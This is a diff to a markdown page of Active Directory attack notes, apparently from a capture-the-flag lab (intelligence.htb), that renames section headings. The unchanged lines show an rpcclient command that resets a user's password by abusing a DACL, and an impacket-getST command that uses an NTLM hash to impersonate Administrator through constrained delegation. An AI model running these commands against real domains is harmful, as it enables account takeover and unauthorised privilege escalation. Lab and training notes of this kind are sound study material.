@@ -46,7 +46,7 @@ Now we got the credentials Objects, let's open a new session with the privileged
 
 This Dacl means we can change the user's password without knowing his current one.
 
-Change it using rpcclient:
+Abuse it using rpcclient:
 
     1. rpcclient -U <username> <ip>
     2. setuserinfo2 <username-we-can-change-password-to> 23 'NewPassword123!'
@@ -59,9 +59,7 @@ Change it using PowerView:
 ### AllowsToDelegate
 The constrained delegation primitive allows a principal to authenticate as any user to specific services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the target computer.
 
-Exploit
-
-Get a service ticket using impacket:
+Abuse:
 
     1. impacket-getST.py -spn cifs/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes :67065141d298d67a17ee8626476b20f9
     2. export KRB5CCNAME=Administrator.ccache
